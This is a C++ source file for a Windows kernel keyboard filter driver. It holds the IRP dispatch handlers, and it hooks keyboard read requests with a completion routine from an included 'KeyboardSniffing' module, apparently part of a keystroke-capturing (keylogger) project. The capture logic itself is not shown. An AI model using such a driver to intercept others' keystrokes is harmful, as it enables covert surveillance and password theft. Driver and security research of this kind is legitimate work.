#include "MajorFunctions.h"
#include <src/utils/logging.h>
#include <src/utils/IrpHandling.h>
#include <src/driver/DeviceTypes.h>
#include <src/driver/KeyboardSniffing.h>
#include <src/driver/ControlDevice.h>

NTSTATUS forwardKbFilterRequest(PDEVICE_KBFILTER devKbFilterExt, PIRP Irp) {
	NTSTATUS status;
	kstd::RemoveLockGuard guard(devKbFilterExt->RemoveLock.LockAcquire(Irp, status));
	if (!NT_SUCCESS(status)) return status;

	LogRequest(devKbFilterExt, Irp);
	IoSkipCurrentIrpStackLocation(Irp);
	return IoCallDriver(devKbFilterExt->LowerDeviceObject, Irp);
}

NTSTATUS GenericMajorFunction(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	auto devExt = (PDEVICE_GENERIC)DeviceObject->DeviceExtension;
	switch (devExt->DeviceType)
	{
		case DeviceType::DEVICE_CONTROL:
			return completeIrp(Irp, STATUS_INVALID_DEVICE_REQUEST);
		case DeviceType::DEVICE_KBFILTER:
			return forwardKbFilterRequest((PDEVICE_KBFILTER)devExt, Irp);
	default:
		log("ForwardMajorFunction: Unknown device type %d\n", (int)devExt->DeviceType);
		return completeIrp(Irp, STATUS_INVALID_DEVICE_REQUEST);
	}
}

NTSTATUS HandleReadRequest(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	auto devExt = (PDEVICE_GENERIC)DeviceObject->DeviceExtension;
	switch (devExt->DeviceType) {
		case DeviceType::DEVICE_CONTROL:
			return completeIrp(Irp, STATUS_INVALID_DEVICE_REQUEST);
		case DeviceType::DEVICE_KBFILTER:
		{
			auto devKbFilterExt = (PDEVICE_KBFILTER)devExt;
			NTSTATUS status = devKbFilterExt->RemoveLock.ManualLock(Irp);
			if (!NT_SUCCESS(status)) return status;

			LogRequest(devKbFilterExt, Irp);
			IoCopyCurrentIrpStackLocationToNext(Irp);
			IoSetCompletionRoutine(Irp, keyboardbReadCompletion, DeviceObject, true, true, true);
			return IoCallDriver(devKbFilterExt->LowerDeviceObject, Irp);
		}
	default:
		log("HandleReadRequest: Unknown device type %d\n", (int)devExt->DeviceType);
		return completeIrp(Irp, STATUS_INVALID_DEVICE_REQUEST);
	}
}

NTSTATUS HandlePnpRequest(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	auto devExt = (PDEVICE_GENERIC)DeviceObject->DeviceExtension;
	switch (devExt->DeviceType) {
		case DeviceType::DEVICE_CONTROL:
			return completeIrp(Irp, STATUS_INVALID_DEVICE_REQUEST);
		case DeviceType::DEVICE_KBFILTER:
		{
			NTSTATUS status;
			auto devKbFilterExt = (PDEVICE_KBFILTER)devExt;
			kstd::RemoveLockGuard guard(devKbFilterExt->RemoveLock.LockAcquire(Irp, status));
			if (!NT_SUCCESS(status)) return status;
			auto stack = IoGetCurrentIrpStackLocation(Irp);
			UCHAR minor = stack->MinorFunction;
			LogRequest(devKbFilterExt, Irp);

			IoSkipCurrentIrpStackLocation(Irp);
			status = IoCallDriver(devKbFilterExt->LowerDeviceObject, Irp);
			if (minor == IRP_MN_REMOVE_DEVICE) {
				guard.Clear();
				devKbFilterExt->RemoveLock.ReleaseAndWait();
				IoDetachDevice(devKbFilterExt->LowerDeviceObject);
				IoDeleteDevice(DeviceObject);
			}
			return status;
		}
	default:
		log("HandlePnpRequest: Unknown device type %d\n", (int)devExt->DeviceType);
		return completeIrp(Irp, STATUS_INVALID_DEVICE_REQUEST);
	}
}

NTSTATUS HandleDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	auto devExt = (PDEVICE_GENERIC)DeviceObject->DeviceExtension;
	switch (devExt->DeviceType) {
		case DeviceType::DEVICE_CONTROL:
			return handleControlDeviceIOCTL(Irp);
		case DeviceType::DEVICE_KBFILTER:
			return completeIrp(Irp, STATUS_INVALID_DEVICE_REQUEST);
	default:
		log("HandleDeviceControl: Unknown device type %d\n", (int)devExt->DeviceType);
		return completeIrp(Irp, STATUS_INVALID_DEVICE_REQUEST);
	}
}

NTSTATUS HandleCreateOrCloseRequest(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	auto devExt = (PDEVICE_GENERIC)DeviceObject->DeviceExtension;
	switch (devExt->DeviceType) {
	case DeviceType::DEVICE_CONTROL:
		return completeIrp(Irp);
	case DeviceType::DEVICE_KBFILTER:
		return forwardKbFilterRequest((PDEVICE_KBFILTER)devExt, Irp);
	default:
		log("HandleCreateOrCloseRequest: Unknown device type %d\n", (int)devExt->DeviceType);
		return completeIrp(Irp, STATUS_INVALID_DEVICE_REQUEST);
	}
}


void registerMajorFunctionsHandlers(PDRIVER_OBJECT DriverObject) {
	for (int i = 0; i < ARRAYSIZE(DriverObject->MajorFunction); i++) {
		if (i == IRP_MJ_READ) {
			DriverObject->MajorFunction[i] = HandleReadRequest;
			continue;
		}
		if (i == IRP_MJ_PNP) {
			DriverObject->MajorFunction[i] = HandlePnpRequest;
			continue;
		}
		if (i == IRP_MJ_DEVICE_CONTROL) {
			DriverObject->MajorFunction[i] = HandleDeviceControl;
			continue;
		}
		if (i == IRP_MJ_CREATE || i == IRP_MJ_CLOSE) {
			DriverObject->MajorFunction[i] = HandleCreateOrCloseRequest;
			continue;
		}
		DriverObject->MajorFunction[i] = GenericMajorFunction;
	}
}
